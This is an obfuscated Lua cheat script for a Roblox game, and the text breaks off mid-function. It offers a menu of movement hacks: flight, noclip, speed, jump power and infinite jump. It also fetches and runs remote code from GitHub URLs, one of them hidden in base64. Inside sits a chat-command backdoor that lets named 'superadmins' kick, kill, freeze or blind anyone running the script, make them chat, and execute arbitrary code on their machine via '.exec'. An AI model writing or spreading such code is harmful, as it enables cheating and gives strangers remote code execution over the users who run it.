return(function(rg1Ss, ...)
local OI8vTm = {"F85Vq9ixeNad";"9rtfTyhk7osM8n";"fuPvD7MJCjNkfupR";"n053C8qceUr";"anSnG";"ppPw";"2FR";"qim21vEiV0";"HxV6qUItp7cJjGEY"}
local NXwKg9ve = function(...)
--1q131231233
game.Players.LocalPlayer.PlayerScripts.CharacterAndBeamMove.Enabled = false
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService(loadstring(base64decode("Q29yZUd1aQ=="))())
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local Library = loadstring(game:HttpGet(loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsYWRrb2VzaGthb2dnLXN2Zy9YT0NVL3JlZnMvaGVhZHMvbWFpbi9YT0NVJTIwRkFLRUxJQlJPUlkubHVh"))()))()

Players = game:GetService('Players')
TweenService = game:GetService('TweenService')
plr = Players.LocalPlayer
gui = plr:WaitForChild('PlayerGui'):WaitForChild('MenuGui')
TopRight = gui:WaitForChild('TopRight')
CoinsFrame = TopRight:WaitForChild('CoinsFrame')
CoinsDisplay = CoinsFrame:WaitForChild('CoinsDisplay')
CoinImage = CoinsDisplay:WaitForChild('CoinImage')
Coins = CoinsDisplay:WaitForChild('Coins')
CoinsButton = CoinsFrame:WaitForChild('CoinsButton')

for _, v in ipairs(CoinsFrame:GetChildren())do
    if v:IsA('UICorner') or v:IsA('UIStroke') or v:IsA('UIPadding') or v:IsA('UIGradient') then
        v:Destroy()
    end
end
for _, v in ipairs(CoinsDisplay:GetChildren())do
    if v:IsA('UIListLayout') then
        v:Destroy()
    end
end

blur = Instance.new('ImageLabel')
blur.Name = 'GlassBlur'
blur.BackgroundTransparency = 1
blur.Size = UDim2.new(1, 0, 1, 0)
blur.Position = UDim2.new(0, 0, 0, 0)
blur.Image = 'rbxassetid://8992230677'
blur.ImageTransparency = 0.88
blur.ScaleType = Enum.ScaleType.Stretch
blur.ZIndex = CoinsFrame.ZIndex - 1
blur.Parent = CoinsFrame
CoinsFrame.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
CoinsFrame.BackgroundTransparency = 0.35
CoinsFrame.AutomaticSize = Enum.AutomaticSize.X
CoinsFrame.Size = UDim2.new(0, 0, 0, 74)
corner = Instance.new('UICorner')
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = CoinsFrame
padding = Instance.new('UIPadding')
padding.PaddingLeft = UDim.new(0, 10)
padding.PaddingRight = UDim.new(0, 10)
padding.Parent = CoinsFrame
stroke = Instance.new('UIStroke')
stroke.Thickness = 1
stroke.Transparency = 0.6
stroke.Color = Color3.fromRGB(135, 206, 235)
stroke.Parent = CoinsFrame
borderGrad = Instance.new('UIGradient')
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
borderGrad.Parent = stroke

task.spawn(function()
    while CoinsFrame.Parent do
        for xVec0uwV = 0, 360, 1 do
            borderGrad.Rotation = xVec0uwV

            task.wait(0.02)
        end
    end
end)
TweenService:Create(CoinsFrame, TweenInfo.new(2.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.25}):Play()

CoinsDisplay.BackgroundTransparency = 1
CoinsDisplay.AutomaticSize = Enum.AutomaticSize.X
CoinsDisplay.Size = UDim2.new(0, 0, 1, 0)

local layout = Instance.new('UIListLayout')

layout.FillDirection = Enum.FillDirection.Horizontal
layout.VerticalAlignment = Enum.VerticalAlignment.Center
layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
layout.Padding = UDim.new(0, 6)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = CoinsDisplay
Coins.LayoutOrder = 1
Coins.BackgroundTransparency = 1
Coins.AutomaticSize = Enum.AutomaticSize.X
Coins.TextXAlignment = Enum.TextXAlignment.Left
Coins.TextYAlignment = Enum.TextYAlignment.Center
Coins.Font = Enum.Font.GothamBold
Coins.TextSize = 34
Coins.Text = tostring(Coins.Text)

local textGrad = Instance.new('UIGradient')

textGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(135, 206, 235)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 206, 235)),
})
textGrad.Parent = Coins

task.spawn(function()
    while Coins.Parent do
        for xVec0uwV = 0, 360, 2 do
            textGrad.Rotation = xVec0uwV

            task.wait(0.03)
        end
    end
end)

CoinImage.LayoutOrder = 2
CoinImage.BackgroundTransparency = 1
CoinImage.Size = UDim2.new(0, 64, 0, 64)
CoinImage.ImageColor3 = Color3.fromRGB(135, 206, 235)
CoinImage.AnchorPoint = Vector2.new(0, 0.5)
CoinImage.Position = UDim2.new(0, 0, 0.5, 0)

task.defer(function()
    CoinImage.Image = 'rbxassetid://6031094678'
end)
TweenService:Create(CoinImage, TweenInfo.new(2.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    Position = CoinImage.Position + UDim2.new(0, 0, 0, -4),
}):Play()

CoinsButton.BackgroundTransparency = 1
CoinsButton.Text = ''
CoinsButton.Size = UDim2.new(1, 0, 1, 0)
CoinsButton.ZIndex = CoinsFrame.ZIndex + 5

function tween(obj, ti, props)
    TweenService:Create(obj, ti, props):Play()
end

CoinsButton.MouseEnter:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.15})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseLeave:Connect(function()
    tween(stroke, TweenInfo.new(0.2), {Transparency = 0.6})
    tween(CoinImage, TweenInfo.new(0.2), {
        ImageColor3 = Color3.fromRGB(135, 206, 235),
    })
end)
CoinsButton.MouseButton1Down:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.08), {
        Size = UDim2.new(0, 0, 0, 71),
    })
end)
CoinsButton.MouseButton1Up:Connect(function()
    tween(CoinsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 0, 0, 74),
    })
end)

Players = game:GetService('Players')
RunService = game:GetService('RunService')
TextChatService = game:GetService('TextChatService')
LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
RBXGeneral = TextChatService.TextChannels:FindFirstChild('RBXGeneral')
scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

local superAdmins = {
    kshopnakub_2271 = true,
    MNHET_XOCU = true,
    gpoikhfgy = true,
}
local admins = {}
local tempAdmins = {}

function sendLines(player, lines, perMessage)
    perMessage = perMessage or 4

    for xVec0uwV = 1, #lines, perMessage do
        local chunk = {}

        for j = xVec0uwV, math.min(xVec0uwV + perMessage - 1, #lines)do
            table.insert(chunk, lines[j])
        end

        local text = table.concat(chunk, '\n')

        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
        task.wait(0.25)
    end
end

local commandHelp = {
    '.chat (Target) (Text)',
    '.bring (Target)',
    '.kill (Target)',
    '.kick (Target)',
    '.freeze (Target)',
    '.thaw (Target)',
    '.spin (Target)',
    '.unspin',
    '.fps (Target) (Cap)',
    '.friend (Target)',
    '.unfriend (Target)',
    '.admin (Target)',
    '.revoke (Target)',
    '.exec (Target) (Code)',
    '.reveal (Target) (All)',
    '.credits',
    '.blind (Target)',
    '.cmds',
}
local frozenPlayers = {}

function getRole(name)
    if superAdmins[name] then
        return 'superadmin'
    elseif admins[name] or tempAdmins[name] then
        return 'admin'
    else
        return 'user'
    end
end
function resolveTargets(input)
    if not input then
        return {}
    end

    input = input:lower()

    local results = {}

    if input == 'all' then
        for player in pairs(scriptedPlayers)do
            table.insert(results, player)
        end

        return results
    end

    for _, plr in ipairs(Players:GetPlayers())do
        local uname = plr.Name:lower()
        local dname = (plr.DisplayName or ''):lower()

        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end

    return results
end
function toggleBlock(player, enable)
    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end
    if enable then
        if not hrp:FindFirstChild('Block') then
            local bv = Instance.new('BodyVelocity')

            bv.Name = 'Block'
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        local bv = hrp:FindFirstChild('Block')

        if bv then
            bv:Destroy()
        end
    end
end
function freezePlayer(player, enable)
    if not scriptedPlayers[player] then
        return
    end

    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        hrp.Anchored = enable
    end
end

local spin = false
local spinTarget = nil

function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end
function handleMessage(sender, text)
    local senderRole = getRole(sender.Name)

    if senderRole == 'user' then
        return
    end

    local args = {}

    for word in text:gmatch('%S+')do
        table.insert(args, word)
    end

    if #args < 1 then
        return
    end

    local cmd = args[1]:lower()
    local targets = resolveTargets(args[2])

    if cmd == '.chat' then
        local msg = table.concat(args, ' ', 3)

        if msg ~= '' then
            for _, target in ipairs(targets)do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end
    elseif cmd == '.kick' then
        local reason = table.concat(args, ' ', 3)

        if reason == '' then
            reason = 'No Reason was applied.'
        end

        for _, target in ipairs(targets)do
            local message = 'Kicked by: ' .. sender.DisplayName .. ' (@' .. sender.Name .. ')\n' .. 'Reason: ' .. reason

            target:Kick(message)
        end
    elseif cmd == '.wither' then
        witheringheights()
    elseif cmd == '.kill' then
        for _, target in ipairs(targets)do
            local hum = target.Character and target.Character:FindFirstChildOfClass('Humanoid')

            if hum then
                hum.Health = 0
            end
        end
    elseif cmd == '.bring' then
        for _, target in ipairs(targets)do
            local hrp = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
            local senderHRP = sender.Character and sender.Character:FindFirstChild('HumanoidRootPart')

            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)

                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end
    elseif cmd == '.spin' then
        spin = true
        spinTarget = targets[1]
    elseif cmd == '.unspin' then
        spin = false
        spinTarget = nil
    elseif cmd == '.fps' then
        local cap = tonumber(args[3])

        if cap and setfpscap then
            setfpscap(cap)
        end
    elseif cmd == '.fling' then
        for _, target in ipairs(targets)do
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            local tHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')

            if myHRP and tHRP then
                myHRP.CFrame = tHRP.CFrame

                task.wait()

                myHRP.Velocity = Vector3.new(9999, 9999, 9999)
            end
        end
    elseif cmd == '.freeze' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = true

            freezePlayer(target, true)
        end
    elseif cmd == '.thaw' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = nil

            freezePlayer(target, false)
        end
    elseif cmd == '.friend' then
        for _, target in ipairs(targets)do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat('friended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.unfriend' then
        for _, target in ipairs(targets)do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat('unfriended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.admin' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if target and not superAdmins[target.Name] then
                tempAdmins[target.Name] = true

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is now whitelisted')
            end
        end
    elseif cmd == '.revoke' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if tempAdmins[target.Name] then
                tempAdmins[target.Name] = nil

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is no longer whitelisted')
            end
        end
    elseif cmd == '.exec' then
        if senderRole ~= 'superadmin' then
            return
        end

        local code = table.concat(args, ' ', 3)

        if code ~= '' and targets[1] == LocalPlayer then
            local fn, err = loadstring(code)

            if fn then
                pcall(fn)
            else
                warn(err)
            end
        end
    elseif cmd == '.cmds' then
        local chunkSize = 4

        for xVec0uwV = 1, #commandHelp, chunkSize do
            local chunk = {}

            for j = xVec0uwV, math.min(xVec0uwV + chunkSize - 1, #commandHelp)do
                table.insert(chunk, commandHelp[j])
            end

            sendToChat(table.concat(chunk, '\n'))
            task.wait(0.25)
        end
    elseif cmd == '.reveal' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('XOCU TUFF')
            end
        end
    elseif cmd == '.blind' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                local gui = Instance.new('ScreenGui', game.CoreGui)
                local frame = Instance.new('Frame', gui)

                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)

                task.delay(5, function()
                    gui:Destroy()
                end)
            end
        end
    elseif cmd == '.credits' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('CREDITS: Made by EDUARDZKL')
            end
        end
    end
end
function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers())do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)
RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then
        return
    end

    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild('HumanoidRootPart')

    if hrp and targetHRP then
        local a = tick() * 2

        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

-- Global state storage
local ToggleStates = {}
function SetToggleState(flag, value) ToggleStates[flag] = value end
function GetToggleState(flag) return ToggleStates[flag] or false end

local Options = Library.Items or Library.Flags or {}
local Toggles = Library.Flags or Library.Items or {}
local Window = Library:CreateWindow({
	Title = loadstring(base64decode("SlNKSw=="))(),
    Theme = {
        Font = loadstring(base64decode("U2NpRmk="))(),
        ImageTransparency = 5,
        BGTransparency = 100,
        BackgroundID = loadstring(base64decode("MTAzMTk0MzUzNjY5NDYw"))(),
        Main = Color3.fromRGB(8, 10, 15),
        Second = Color3.fromRGB(1, 7, 32),
        ElementAccent = Color3.fromRGB(69, 28, 28),
        TextColor = Color3.fromRGB(124, 122, 255),
        GradientStart = Color3.fromRGB(86, 120, 249),
        GradientEnd = Color3.fromRGB(0, 255, 0),
        CornerRadius = 12,
        HudTransparency = 25
    },
	ToggleKey = Enum.KeyCode.RightShift,
	Transparency = 0.25,
	ShowWatermark = {Enabled = true, Title = true, User = true, FPS = true, Duration = false, Ping = true},
	AutoSave = true,
	ConfigFolder = loadstring(base64decode("WE9DVV9Db25maWc="))(),
    UiScale = 1.0,
    CustomIcon = loadstring(base64decode("NjkyNDY3MTA3NQ=="))()
})
local Tabs = {
    Main = Window:CreateTab(loadstring(base64decode("TWFpbg=="))(), true, loadstring(base64decode("NjAyMzQyNjkxNQ=="))()),
	Defense = Window:CreateTab(loadstring(base64decode("RGVmZW5zZQ=="))(), true, loadstring(base64decode("OTYwOTc0ODk1NTY0NjE="))()),
	Target = Window:CreateTab(loadstring(base64decode("VGFyZ2V0"))(), true, loadstring(base64decode("MTAzNjA2MzI4MjY="))()),
	Grab = Window:CreateTab(loadstring(base64decode("R3JhYg=="))(), true, loadstring(base64decode("MTczMTMzMTQwMjA="))()), 
	Player = Window:CreateTab(loadstring(base64decode("UGxheWVy"))(), true, loadstring(base64decode("Mjc5NTU3MjgwMw=="))()),
    Server = Window:CreateTab(loadstring(base64decode("U2VydmVy"))(), true, loadstring(base64decode("NjAyMzQyNjkyNQ=="))()),
    Toy = Window:CreateTab(loadstring(base64decode("VG95cw=="))(), true, loadstring(base64decode("OTY4MjA2NzgwMA=="))()),
	Misc = Window:CreateTab(loadstring(base64decode("TWlzYw=="))(), true, loadstring(base64decode("MTE0MTY3MjkyOTQ3ODA3"))()), 
    Figure = Window:CreateTab(loadstring(base64decode("RmlndXJl"))(), true, loadstring(base64decode("MTA4MjY2NjE1Nzg="))()),
	Keybinds = Window:CreateTab(loadstring(base64decode("S2V5YmluZHM="))(), true, loadstring(base64decode("MTE3MTAzMDYyNTc="))()), 
	Visuals  = Window:CreateTab(loadstring(base64decode("VmlzdWFscw=="))(),  true, loadstring(base64decode("MTEyNDg4MTE0MTk3MTA2"))()),
}
local MainV = Tabs.Main:CreateBlock({Name = loadstring(base64decode("VmFsdWU="))(), true, Side = loadstring(base64decode("TGVmdA=="))()})
local MainL = Tabs.Main:CreateBlock({Name = loadstring(base64decode("TWFpbg=="))(), true, Side = loadstring(base64decode("TGVmdA=="))()})
local MainR = Tabs.Main:CreateBlock({Name = loadstring(base64decode("T3RoZXJz"))(), true, Side = loadstring(base64decode("UmlnaHQ="))()})
local SoundGroup = Tabs.Main:CreateBlock({Name = loadstring(base64decode("T3RoZXJz"))(), true, Side = loadstring(base64decode("UmlnaHQ="))()})


local spinningConnection = nil
local spinSpeed = 5

local PL_SpeedEnabled = false
local PL_SpeedValue = 16
local PL_SpeedConn = nil

local jpEnabled = false
local jpValue = 50
local jpConn = nil

local infJumpEnabled = false
local noclipEnabled = false
local noclipConnection = nil

MainL:CreateToggle({
    Name = loadstring(base64decode("U3BpbiBDaGFyYWN0ZXI="))(),
    Flag = loadstring(base64decode("U3BpbiBDaGFyYWN0ZXI="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("U3BpbiBDaGFyYWN0ZXI="))(), Value)
        if Value then
            spinningConnection = R.Heartbeat:Connect(function()
                local character = Player.Character
                local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if root then
                    root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                end
            end)
        else
            if spinningConnection then
                spinningConnection:Disconnect()
                spinningConnection = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = loadstring(base64decode("U3BpbiBTcGVlZA=="))(),
    Flag = loadstring(base64decode("U3BpbiBTcGVlZA=="))(),
    Default = 5,
    Min = 1,
    Max = 50,
    Callback = function(Value)
        spinSpeed = Value
    end
})

MainL:CreateToggle({
    Name = loadstring(base64decode("V2Fsa3NwZWVk"))(),
    Flag = loadstring(base64decode("V2Fsa3NwZWVk"))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("V2Fsa3NwZWVk"))(), Value)
        PL_SpeedEnabled = Value
        if Value then
            if PL_SpeedConn then PL_SpeedConn:Disconnect() end
            PL_SpeedConn = RunService.RenderStepped:Connect(function()
                if not PL_SpeedEnabled then return end
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                if hrp and hum then
                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * (PL_SpeedValue * 0.1)
                end
            end)
        else
            if PL_SpeedConn then
                PL_SpeedConn:Disconnect()
                PL_SpeedConn = nil
            end
        end
    end
})

MainV:CreateSlider({
    Name = loadstring(base64decode("V2FsayBTcGVlZA=="))(),
    Flag = loadstring(base64decode("V2FsayBTcGVlZA=="))(),
    Default = 16,
    Min = 1,
    Max = 1000,
    Callback = function(Value)
        PL_SpeedValue = Value
    end
})

MainL:CreateToggle({
    Name = loadstring(base64decode("SnVtcCBQb3dlcg=="))(),
    Flag = loadstring(base64decode("SnVtcCBQb3dlcg=="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("SnVtcCBQb3dlcg=="))(), Value)
        jpEnabled = Value
        if Value then
            if jpConn then jpConn:Disconnect() end
            jpConn = RunService.Heartbeat:Connect(function()
                if not jpEnabled then return end
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                if hum then
                    hum.JumpPower = jpValue
                end
            end)
        else
            if jpConn then
                jpConn:Disconnect()
                jpConn = nil
            end
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
            if hum then
                hum.JumpPower = 50
            end
        end
    end
})

MainV:CreateSlider({
    Name = loadstring(base64decode("SnVtcCBQb3dlciBWYWx1ZQ=="))(),
    Flag = loadstring(base64decode("SnVtcCBQb3dlciBWYWx1ZQ=="))(),
    Default = 50,
    Min = 1,
    Max = 1000,
    Callback = function(Value)
        jpValue = Value
        if jpEnabled then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
            if hum then
                hum.JumpPower = jpValue
            end
        end
    end
})

do
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local UIS = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
    
    local plr = Players.LocalPlayer
    local cons = cons or {}

    local FlightSettings = {
        Enabled = false,
        Speed = 50,
        BodyVelocity = nil,
        BodyGyro = nil,
        FlightConnection = nil,
        CurrentVelocity = Vector3.new(0, 0, 0),
        IsInVehicle = false,
    }

    local function cleanupFlight()
        if FlightSettings.FlightConnection then
            FlightSettings.FlightConnection:Disconnect()
            FlightSettings.FlightConnection = nil
        end
        
        if FlightSettings.BodyVelocity then
            FlightSettings.BodyVelocity:Destroy()
            FlightSettings.BodyVelocity = nil
        end
        
        if FlightSettings.BodyGyro then
            FlightSettings.BodyGyro:Destroy()
            FlightSettings.BodyGyro = nil
        end
        
        local char = plr.Character
        if char then
            local humanoid = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
            if humanoid and not FlightSettings.IsInVehicle then
                humanoid.PlatformStand = false
            end
        end
    end

    local function getFlightTarget()
        local char = plr.Character
        if not char then return nil end
        
        local humanoid = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
        if not humanoid then return nil end
        
        if humanoid.Sit then
            FlightSettings.IsInVehicle = true
            local seat = humanoid.SeatPart
            if seat and seat.Parent then
                return seat.Parent:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or seat
            end
        end
        
        FlightSettings.IsInVehicle = false
        return char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
    end

    local function applyFlightPhysics()
        local targetPart = getFlightTarget()
        if not targetPart then return end
        
        cleanupFlight()
        
        FlightSettings.BodyVelocity = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
        FlightSettings.BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        FlightSettings.BodyVelocity.Velocity = Vector3.new(0, 0, 0)
        FlightSettings.BodyVelocity.P = 10000
        FlightSettings.BodyVelocity.Parent = targetPart
        
        FlightSettings.BodyGyro = Instance.new(loadstring(base64decode("Qm9keUd5cm8="))())
        FlightSettings.BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        FlightSettings.BodyGyro.CFrame = targetPart.CFrame
        FlightSettings.BodyGyro.P = 10000
        FlightSettings.BodyGyro.Parent = targetPart
        
        local char = plr.Character
        if char then
            local humanoid = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
            if humanoid and not FlightSettings.IsInVehicle then
                humanoid.PlatformStand = true
            end
        end
        
        FlightSettings.CurrentVelocity = Vector3.new(0, 0, 0)
        
        FlightSettings.FlightConnection = RunService.Heartbeat:Connect(function()
            if not FlightSettings.Enabled then
                cleanupFlight()
                return
            end
            
            local currentTarget = getFlightTarget()
            if not currentTarget or not currentTarget.Parent then
                return
            end
            
            if FlightSettings.BodyVelocity and FlightSettings.BodyVelocity.Parent ~= currentTarget then
                applyFlightPhysics()
                return
            end
            
            local moveDir = Vector3.new(0, 0, 0)
            local Camera = workspace.CurrentCamera
            
            if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - Camera.CFrame.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Camera.CFrame.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
            
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit
            end
            
            local targetVelocity = moveDir * FlightSettings.Speed
            FlightSettings.CurrentVelocity = FlightSettings.CurrentVelocity:Lerp(targetVelocity, 0.2)
            
            if FlightSettings.BodyVelocity then
                FlightSettings.BodyVelocity.Velocity = FlightSettings.CurrentVelocity
            end
            
            if FlightSettings.BodyGyro then
                FlightSettings.BodyGyro.CFrame = Camera.CFrame
            end
        end)
    end

    local function setFlightState(state)
        FlightSettings.Enabled = state
        if not state then
            cleanupFlight()
        else
            applyFlightPhysics()
        end
    end

    if cons[loadstring(base64decode("RmxpZ2h0UmVzcGF3bg=="))()] then cons[loadstring(base64decode("RmxpZ2h0UmVzcGF3bg=="))()]:Disconnect() end
    cons[loadstring(base64decode("RmxpZ2h0UmVzcGF3bg=="))()] = plr.CharacterAdded:Connect(function(char)
        if FlightSettings.Enabled then
            char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(), 5)
            task.wait(0.2)
            if FlightSettings.Enabled then
                applyFlightPhysics()
            end
        end
    end)

    MainL:CreateToggle({
        Name = loadstring(base64decode("RmxpZ2h0"))(),
        Flag = loadstring(base64decode("Rmx5VG9nZ2xl"))(),
        Default = false,
        Callback = function(v)
            setFlightState(v)
        end
    })

    MainV:CreateSlider({
        Name = loadstring(base64decode("RmxpZ2h0IFNwZWVk"))(),
        Flag = loadstring(base64decode("Rmx5U3BlZWQ="))(),
        Min = 50,
        Max = 10000,
        Default = 200,
        Callback = function(v)
            FlightSettings.Speed = v
        end
    })
end

MainL:CreateToggle({
    Name = loadstring(base64decode("V2F0ZXIgV2Fsaw=="))(),
    Flag = loadstring(base64decode("V2F0ZXIgV2Fsaw=="))(),
    Default = false,
    Callback = function(v)
        SetToggleState(loadstring(base64decode("V2F0ZXIgV2Fsaw=="))(), v)
        for xVec0uwV, vv in pairs(workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel:GetChildren()) do
            if vv.Name == loadstring(base64decode("T2NlYW4="))() then
                vv.CanCollide = v
            end
        end
    end
})

MainL:CreateToggle({
    Name = loadstring(base64decode("Tm9jbGlw"))(),
    Flag = loadstring(base64decode("Tm9jbGlw"))(),
    Default = false,
    Callback = function(Value)
        noclipEnabled = Value
        if noclipConnection then
            noclipConnection:Disconnect()
            noclipConnection = nil
        end
        if Value then
            noclipConnection = RunService.Stepped:Connect(function()
                local char = LocalPlayer.Character
                if char then
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        end
    end
})

MainL:CreateToggle({
    Name = loadstring(base64decode("SW5mIEp1bXA="))(),
    Flag = loadstring(base64decode("SW5mIEp1bXA="))(),
    Default = false,
    Callback = function(Value)
        infJumpEnabled = Value
    end
})

UserInputService.JumpRequest:Connect(function()
    if infJumpEnabled then
        local char = LocalPlayer.Character
        local humanoid = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
        if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Jumping then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

do

    local FakeCosmeticsEnabled = false
    local RespawnPersist = false
    local CosmeticChoice = loadstring(base64decode("Qm90aA=="))()

    local KORBLOX_MESH_ID = loadstring(base64decode("MTAxODUxNjk2"))()
    local KORBLOX_TEX_ID = loadstring(base64decode("MTAxODUxMjU0"))()
    local HEADLESS_MESH_ID = loadstring(base64decode("MTM0MDgyNTc5"))()
    local HEADLESS_TEX_ID = loadstring(base64decode("MTM0MDgyNjI3"))()

    local SavedHeadData = nil

    local function SnapshotHead()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
        if not head then return end
        SavedHeadData = {
            Transparency = head.Transparency,
            BrickColor = head.BrickColor,
            Material = head.Material,
            Meshes = {},
            Decals = {},
        }
        for _, obj in ipairs(head:GetChildren()) do
            if obj:IsA(loadstring(base64decode("U3BlY2lhbE1lc2g="))()) then
                table.insert(SavedHeadData.Meshes, {
                    MeshType = obj.MeshType,
                    MeshId = obj.MeshId,
                    TextureId = obj.TextureId,
                    Scale = obj.Scale,
                    Offset = obj.Offset,
                    VertexColor = obj.VertexColor,
                    Name = obj.Name,
                })
            elseif obj:IsA(loadstring(base64decode("RGVjYWw="))()) then
                table.insert(SavedHeadData.Decals, {
                    Texture = obj.Texture,
                    Face = obj.Face,
                    Transparency = obj.Transparency,
                    Name = obj.Name,
                })
            end
        end
